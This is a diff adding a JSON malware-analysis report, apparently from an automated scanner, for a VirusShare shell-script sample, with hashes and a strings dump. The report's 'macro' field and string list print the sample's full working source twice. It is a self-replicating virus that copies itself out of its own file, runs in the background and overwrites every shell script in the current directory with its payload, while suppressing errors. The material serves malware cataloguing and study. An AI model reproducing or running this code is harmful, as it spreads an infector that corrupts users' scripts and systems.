@@ -1,0 +1,47 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#!/bin/sh\ntail -13 $0 > tmp 2>/dev/null\nchmod +x tmp 2>/dev/null\n./tmp $0 & 2>/dev/null\n\nexit 0\n\n#!/bin/sh\nfor F in *\ndo\n  if [ \"$(head -c9 $F 2>/dev/null)\" = \"#!/bin/sh\" ]\n  then\n        HOST=$(cat $F|tr '\\n' \\xc7)\n        head -5 $1 > $F 2>/dev/null\n        echo $HOST | tr \\xc7 '\\n' | grep -v '#!/bin/sh'>> $F 2>/dev/null\n        tail -14 $1 >> $F 2>/dev/null\n  fi\ndone\nrm tmp 2>/dev/null"
+    },
+    "filename": "VirusShare_135c1a5241ab972d23fe71446e0da35a",
+    "filesize": 411,
+    "filetype": "POSIX shell script, ASCII text executable, with CRLF line terminators",
+    "hashes": {
+        "md5": "135c1a5241ab972d23fe71446e0da35a",
+        "sha1": "ca06e20264050edc42e3775116afe31cac62a948",
+        "sha256": "08cc5ce8c8ab9325776b66a87d028dc688d00d66cade353fa268f782442dd613"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/sh",
+            "tail -13 $0 > tmp 2>/dev/null",
+            "chmod +x tmp 2>/dev/null",
+            "./tmp $0 & 2>/dev/null",
+            "exit 0",
+            "#!/bin/sh",
+            "for F in *",
+            "  if [ \"$(head -c9 $F 2>/dev/null)\" = \"#!/bin/sh\" ]",
+            "  then",
+            "        HOST=$(cat $F|tr '\\n' \\xc7)",
+            "        head -5 $1 > $F 2>/dev/null",
+            "        echo $HOST | tr \\xc7 '\\n' | grep -v '#!/bin/sh'>> $F 2>/dev/null",
+            "        tail -14 $1 >> $F 2>/dev/null",
+            "  fi",
+            "done",
+            "rm tmp 2>/dev/null"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.258822",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
